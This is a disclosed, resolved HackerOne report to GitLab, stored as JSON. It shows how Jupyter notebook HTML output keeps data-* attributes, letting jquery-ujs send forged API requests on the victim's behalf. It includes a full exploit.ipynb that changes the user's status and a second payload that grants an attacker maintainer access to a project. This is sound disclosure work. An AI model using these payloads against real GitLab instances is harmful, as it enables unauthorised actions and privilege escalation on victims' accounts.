{
  "id": 970869,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzA4Njk=",
  "url": "https://hackerone.com/reports/970869",
  "title": "Sending Arbitrary Requests through Jupyter Notebooks on gitlab.com and Self-Hosted GitLab Instances",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-08-30T18:14:35.191Z",
  "submitted_at": "2020-08-30T18:14:35.262Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "iwis",
    "url": "/iwis",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-02-10T14:46:45.898Z",
  "bug_reporter_agreed_on_going_public_at": "2022-02-09T23:51:30.777Z",
  "team_member_agreed_on_going_public_at": "2022-02-10T14:46:45.684Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "> *NOTE*: I am still researching whether there is a possibility to deploy the exploit without user interaction.\n\n### Summary\n\nGitLab provides a [rich representation](https://docs.gitlab.com/ee/user/project/repository/jupyter_notebooks/) for Jupyter Notebooks (`*.ipynb`). In turn, Jupyter Notebooks provide the possibility for [rich output via HTML](https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb#HTML). Although most tags and attributes are stripped from the HTML output rendered in GitLab's rich representation, it retains `data-*` attributes. Using [`jquery-ujs`](https://gitlab.com/gitlab-org/gitlab/-/blob/4e12f87c013f59070bf1156bb2427af9fa9123c4/package.json#L101) as a gadget, it is possible to trigger `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params). On https://gitlab.com, the CSP restricts the target, while there is no such limitation for self-hosted GitLab instances. As of now, this vulnerability requires user interaction in the form of a single click followed by and applies to https://gitlab.com as well as self-hosted GitLab instances.\n\n### Steps to reproduce\n\n1. Create a GitLab project or refer to an existing project.\n2. Upload an `exploit.ipynb` file with the following contents:\n\n     ```json\n    {\n      \"cells\": [\n        {\n          \"metadata\": { \"trusted\": true },\n          \"cell_type\": \"code\",\n          \"source\": \"Tell me something about you!\",\n          \"execution_count\": 1,\n          \"outputs\": [\n            {\n              \"output_type\": \"display_data\",\n              \"data\": {\n                \"text/plain\": \"<IPython.core.display.HTML object>\",\n                \"text/html\": \"What's your favorite color?&emsp;<select data-method=\\\"put\\\" data-params=\\\"message=p0wn3d\\\" data-remote=\\\"true\\\" data-url=\\\"/api/v4/user/status\\\"><option>Red</option><option>Green</option><option>Blue</option></select>\\n\"\n              },\n              \"metadata\": {}\n            }\n          ]\n        }\n      ],\n      \"metadata\": {\n        \"kernelspec\": {\n          \"name\": \"python3\",\n          \"display_name\": \"Python 3\",\n          \"language\": \"python\"\n        },\n        \"language_info\": {\n          \"name\": \"python\",\n          \"version\": \"3.7.8\",\n          \"mimetype\": \"text/x-python\",\n          \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n          \"pygments_lexer\": \"ipython3\",\n          \"nbconvert_exporter\": \"python\",\n          \"file_extension\": \".py\"\n        }\n      },\n      \"nbformat\": 4,\n      \"nbformat_minor\": 4\n    }\n    ```\nwhere `cells[0].outputs[0].data.text/html` contains the payload.\n3. In the *Files*  view of the project, click on the above-added `exploit.ipynb`.\n4. Select an option other than the default.\n5. Reload the page to recongize that your status has been altered, i.e. click on your profile in the top right corner.\n\n### Impact\n\nAn attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim.\n\nThe impact is similar to that of #824689 and #806571.\n\n### Examples\n\nDue to the destructive nature of the above-described example, I do not provide a public PoC, although I have created [an exemplary repository](https://gitlab.com/dpfuerst/sending-arbitrary-requests-through-jupyter-notebooks). This repository is private, please let me know if you would like me to change the visibility.\n\nThe above-described `exploit.ipynb` [sets the user status](https://docs.gitlab.com/ee/api/users.html#set-user-status) of the victim to `p0wn3d`. However, more critical permission-related exploits are also possible. Consider an attacker with developer access to a project who wants to gain maintainer access, instead. That attacker could upload an exploit like the above with the following payload:\n\n```html\nWhat's your favorite color?&emsp;<select data-method=\\\"put\\\" data-params=\\\"user_id=<ATTACKER_ID>&access_level=40\\\" data-remote=\\\"true\\\" data-url=\\\"/api/v4/projects/<PROJECT_ID>/members\\\"><option>Red</option><option>Green</option><option>Blue</option></select>\\n\n```\n\nwhere `<ATTACKER_ID>` is to be replaced with the attacker's user ID and `<PROJECT_ID>` is to be replaced with the target project's ID to [gain maintainer access](https://docs.gitlab.com/ee/api/members.html#edit-a-member-of-a-group-or-project).\n\n### What is the current *bug* behavior?\n\nThe provided `exploit.ipynb` renders to\n\n```html\nWhat's your favorite color? <select data-url=\"/api/v4/user/status\" data-remote=\"true\" data-params=\"message=p0wn3d\" data-method=\"put\"><option>Red</option><option>Green</option><option>Blue</option></select>\n```\n\n### What is the expected *correct* behavior?\n\nThe provided `exploit.ipynb` should render to\n\n```html\nWhat's your favorite color? <select><option>Red</option><option>Green</option><option>Blue</option></select>\n```\n\nThat is, `data-*` attributes should be stripped from GitLab's rich output. If the `data-*` attributes are necessary to provide another feature within the rich output, their appearance should be whitelisted, at least.\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n```\nSystem information                                                       \nSystem:         Ubuntu 16.04                                             \nProxy:          no                                                       \nCurrent User:   git                                                      \nUsing RVM:      no                                                       \nRuby Version:   2.6.6p146                                                \nGem Version:    2.7.10                                                   \nBundler Version:1.17.3                                                   \nRake Version:   12.3.3                                                   \nRedis Version:  5.0.9                                                    \nGit Version:    2.28.0                                                   \nSidekiq Version:5.2.9                                                    \nGo Version:     unknown                                                  \n                                                                         \nGitLab information                                                       \nVersion:        13.3.2-ee                                                \nRevision:       d4deaad1474                                              \nDirectory:      /opt/gitlab/embedded/service/gitlab-rails                \nDB Adapter:     PostgreSQL                                               \nDB Version:     11.7                                                     \nURL:            <REDACTED>\nHTTP Clone URL: <REDACTED>\nSSH Clone URL:  <REDACTED>\nElasticsearch:  no                                                       \nGeo:            no                                                       \nUsing LDAP:     no                                                       \nUsing Omniauth: yes                                                      \nOmniauth Providers:                                                      \n                                                                         \nGitLab Shell                                                             \nVersion:        13.6.0                                                   \nRepository storage paths:                                                \n- default:      /git/repositories                                        \nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAn attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim. For example, using the GitLab API as a target, an attacker could gain maintainer access to a project, given that the victim is maintainer (or higher) themselves.\n\nThe impact is similar to that of #824689 and #806571.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 969699,
      "file_name": "exploit.ipynb",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e8SMMQpRt3bVhAdyPNjhtyJk?response-content-disposition=attachment%3B%20filename%3D%22exploit.ipynb%22%3B%20filename%2A%3DUTF-8%27%27exploit.ipynb&response-content-type=application%2Fx-ipynb%2Bjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135352Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=09299106f392e7f581c7a23ee3d0952875ce940b79b83ac7566364be47ce4e2f",
      "file_size": 1125,
      "type": "application/x-ipynb+json",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 14,
  "voters": [
    "alp",
    "thruster",
    "ali",
    "glister",
    "akashhamal0x01",
    "ibring",
    "h4x0r_dz",
    "f1ras",
    "ranjith_mayan",
    "damienhunter9",
    "and 4 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.4,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
